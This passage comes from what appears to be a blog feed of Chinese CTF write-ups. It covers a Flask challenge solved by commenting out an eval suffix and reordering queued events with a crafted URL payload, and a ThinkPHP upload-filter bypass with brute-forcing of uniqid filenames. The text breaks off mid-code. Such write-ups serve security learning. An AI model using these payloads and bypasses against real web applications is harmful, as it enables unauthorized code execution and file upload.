request.event_queue.append(event)</span><br></pre></td></tr></table></figure><p><code>request.event_queue</code>：请求的事件队列</p><p><code>xxx_handler</code>：相应事件的处理</p><p><code>execute_event_loop</code>：事件触发循环，持续执行直到<code>request.event_queue</code>为空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action + <span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure><p><code>        #event is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</code></p><p>这里事件依靠有合法格式的请求字段触发，且触发的事件(函数)，会传入<code>list</code>类型的参数</p><p>但是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    event_handler = <span class="built_in">eval</span>(</span><br><span class="line">        action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">    ret_val = event_handler(args)</span><br></pre></td></tr></table></figure><p>所有的事件处理都会加上<code>_handler</code>，如何执行指定函数？</p><h4><span id="绕过">绕过</span></h4><blockquote><p><code>eval</code>函数本质是将字符串str当成有效的表达式来求值并返回计算结果，程序过滤了大部分的特殊符号，导致我们不能随意进行代码注入，不过由于<code>ARGS</code>是使用<code>#</code>进行分隔，而<code>#</code>在python代码中是注释符，在<code>action</code>中加入<code>#</code>，可以把后面<code>_handler</code>注释掉。</p></blockquote><p>现在我们可以执行指定函数了，但不能直接执行flag()……</p><h4><span id="事件触发与检测">事件触发与检测</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br></pre></td></tr></table></figure><p>这里是购买商品的逻辑，分为<code>买</code>与<code>消费</code></p><p><code>buy</code>会先加上购买的数量，再调用<code>consume</code>判断其合理性，错误则回滚（RollBack）</p><p>而获取flag……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br></pre></td></tr></table></figure><p>当购买量大于5时，flag将写入session中（flask的特色session……</p><p><strong>注意：</strong></p><p>事件的触发都由事件队列循环触发，包括判断的<strong>consume_point_function</strong></p><p>如果我们通过函数<code>trigger_event</code>执行，可以一次向队列里加入指定数量的事件，将<strong>consume_point_function</strong>挤到后面，从而绕过检测。</p><h4><span id="flag">flag</span></h4><p><code>?action:trigger_event%23;action:buy;5%23action:get_flag;</code></p><p>再找session解密：</p><p><code>python flask_session_cookie_manager3.py decode -c .eJyNjkHLgkAYhP9KvGcPq0uEgpewAkmXSFv3jQjNKM3dBPWrNvzvRdDhow7dBmbmmblDdT6As17fYZCBA4KHJOV2x6Rv7qPGhN74cPIqn9oym00Vu7gu9Bvj3Ua16oSuy8wa6pybVULHfykfEqZj9wtJYY3JbvRMnDA5vEj_QTqd2TSxsBF8N0J5PSJtLoEX3Jjny3BJtNCxOY8WV5STlnmrUhSECo0ysOJbWOaViHz7l-FfroHq5LZo97IBhxhQnwvVPiXtH6CKZyQ.YUg_lg.gISqBdkGE28iR_tVgmgIN9-xJOA b&#39;&#123;&quot;log&quot;:[[&#123;&quot; b&quot;:&quot;YWN0aW9uOmJ1eTs1&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOmdldF9mbGFnOw==&quot;&#125;],[&#123;&quot; b&quot;:&quot;ZnVuYzpjb25zdW1lX3BvaW50OzU=&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;],&#123;&quot; b&quot;:&quot;ZnVuYzpzaG93X2ZsYWc7ZmxhZ3swMDMyODJmNS0zYzU1LTQxZmEtODVjYi03YzZmM2UyNjdlYTJ9&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;&#39;</code></p><p>解码获得flag！</p><p>参考文章:<br><a href="https://xz.aliyun.com/t/4887">ddctf2019-misc&amp;web&amp;re-writeup</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;python、flask、事件触发&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF-2019-Simple-Upload</title>
    <link href="http://example.com/2021/09/15/RoarCTF-2019-Simple-Upload/"/>
    <id>http://example.com/2021/09/15/RoarCTF-2019-Simple-Upload/</id>
    <published>2021-09-15T05:41:41.693Z</published>
    <updated>2021-09-16T01:02:32.546Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>Tinkphp、文件上传、爆破</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E6%BA%90%E7%A0%81">源码</a></li><li><a href="#thinkphp-%E7%9A%84-upload-%E7%B1%BB-upload-%E6%96%B9%E6%B3%95">thinkphp 的 Upload 类 upload 方法</a></li><li><a href="#upload%E7%9A%84%E8%AF%AF%E7%94%A8">upload的误用</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E7%88%86%E7%A0%B4">文件名爆破</a></li><li><a href="#%E4%BC%98%E5%8C%96-python%E7%89%88%E7%9A%84uniqid">优化–python版的uniqid：</a></li><li><a href="#%E8%BF%98%E6%9C%89%E6%9B%B4%E7%AE%80%E5%8D%95%E7%9A%84">还有更简单的</a></li></ul><!-- tocstop --></div><br>#### 源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/images/RoarCTF-2019-Simple-Upload/image-20210915134604888.png" alt="image-20210915134604888" style="zoom:80%;"><p>下载对应的thinkphp，将源码放入<code>Application/Home/Controller/IndexController</code>，复现环境。</p><p>我们可以看到提供了一个upload方法，我们可以访问<code>/home/index/upload</code> 或 <code>?a=upload</code>来请求upload操作</p><h4><span id="thinkphp-的-upload-类-upload-方法">thinkphp 的 Upload 类 upload 方法</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 上传单个文件</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span>  array  $file 文件数组</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> array        上传成功后的文件信息</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadOne</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      $info = <span class="keyword">$this</span>-&gt;upload(<span class="keyword">array</span>($file));</span><br><span class="line">      <span class="keyword">return</span> $info ? $info[<span class="number">0</span>] : $info;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 上传文件</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> 文件信息数组 $files ，通常是 $_FILES数组</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$files = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> === $files) &#123;</span><br><span class="line">          $files = $_FILES;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($files)) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;error = <span class="string">&#x27;没有上传的文件！&#x27;</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">........</span><br><span class="line">      ........</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到，当无参调用时，$files将为空串，且传入<code>$_FILES</code>数组，即多文件上传</p><p>通过查阅官方文档 <a href="http://document.thinkphp.cn/manual_3_2.html#upload">文件上传</a></p><p>当传入<code>file</code>时，可识别为单文件，传入<code>file1、file2、file3……将识别为多文件上传，上传文件数组</code></p><h4><span id="upload的误用">upload的误用</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>基于以上的了解，我们知道这里可以传多文件数组</p><p>而<code>$uploadFile</code>只拿了<code>$_FILES[&#39;file&#39;]</code>这一个文件</p><p>再者，如果我们不传’file’文件，这玩意甚至拿不到……所以<code>$uploadFile[&#39;name&#39;]</code>也拿不到，过滤不了</p><p>所以我们传入<code>file[]</code>或<code>file1</code>都可以绕过</p><p>至于后面的上传类型设置……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $config = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;mimes&#x27;</span>        =&gt; <span class="keyword">array</span>(), <span class="comment">//允许上传的文件MiMe类型</span></span><br><span class="line">    <span class="string">&#x27;maxSize&#x27;</span>      =&gt; <span class="number">0</span>, <span class="comment">//上传的文件大小限制 (0-不做限制)</span></span><br><span class="line">    <span class="string">&#x27;exts&#x27;</span>         =&gt; <span class="keyword">array</span>(), <span class="comment">//允许上传的文件后缀</span></span><br><span class="line">    <span class="string">&#x27;autoSub&#x27;</span>      =&gt; <span class="literal">true</span>, <span class="comment">//自动子目录保存文件</span></span><br><span class="line">    <span class="string">&#x27;subName&#x27;</span>      =&gt; <span class="keyword">array</span>(<span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;Y-m-d&#x27;</span>), <span class="comment">//子目录创建方式，[0]-函数名，[1]-参数，多个参数使用数组</span></span><br><span class="line">    <span class="string">&#x27;rootPath&#x27;</span>     =&gt; <span class="string">&#x27;./Uploads/&#x27;</span>, <span class="comment">//保存根路径</span></span><br><span class="line">    <span class="string">&#x27;savePath&#x27;</span>     =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//保存路径</span></span><br><span class="line">    <span class="string">&#x27;saveName&#x27;</span>     =&gt; <span class="keyword">array</span>(<span class="string">&#x27;uniqid&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="comment">//上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组</span></span><br><span class="line">    <span class="string">&#x27;saveExt&#x27;</span>      =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//文件保存后缀，空则使用原后缀</span></span><br><span class="line">    <span class="string">&#x27;replace&#x27;</span>      =&gt; <span class="literal">false</span>, <span class="comment">//存在同名是否覆盖</span></span><br><span class="line">    <span class="string">&#x27;hash&#x27;</span>         =&gt; <span class="literal">true</span>, <span class="comment">//是否生成hash编码</span></span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>     =&gt; <span class="literal">false</span>, <span class="comment">//检测文件是否存在回调，如果存在返回文件信息数组</span></span><br><span class="line">    <span class="string">&#x27;driver&#x27;</span>       =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 文件上传驱动</span></span><br><span class="line">    <span class="string">&#x27;driverConfig&#x27;</span> =&gt; <span class="keyword">array</span>(), <span class="comment">// 上传驱动配置</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>allowExts</code>并不存在……</p><p>文件名生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">         $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">         <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>官方手册指明：</p><blockquote><p>默认的命名规则设置是采用uniqid函数生成一个唯一的字符串序列。</p></blockquote><h4><span id="文件名爆破">文件名爆破</span></h4><p>由于上传多文件读不出文件名，故需要在短时间内上传多文件，爆破中间文件</p><blockquote><p>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。</p></blockquote><p><a href="https://www.cnblogs.com/yjf512/p/9057229.html">PHP 的 uniqid 函数产生的 id 真的是唯一的么？</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(uniqid)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">gettimeofday((struct timeval *) &amp;tv, (struct timezone *) <span class="literal">NULL</span>);</span><br><span class="line">sec = (<span class="keyword">int</span>) tv.tv_sec;</span><br><span class="line">usec = (<span class="keyword">int</span>) (tv.tv_usec % <span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> (more_entropy) &#123;</span><br><span class="line">uniqid = strpprintf(<span class="number">0</span>, <span class="string">&quot;%s%08x%05x%.8F&quot;</span>, prefix, sec, usec, php_combined_lcg() * <span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">uniqid = strpprintf(<span class="number">0</span>, <span class="string">&quot;%s%08x%05x&quot;</span>, prefix, sec, usec);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RETURN_STR(uniqid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我用的php测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> uniqid();</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">print_r(gettimeofday());</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="comment">//echo uniqid();</span></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">$time = gettimeofday();</span><br><span class="line">printf(<span class="string">&quot;%08x%05x&quot;</span>,$time[sec],$time[usec]);</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">$time = gettimeofday();</span><br><span class="line">printf(<span 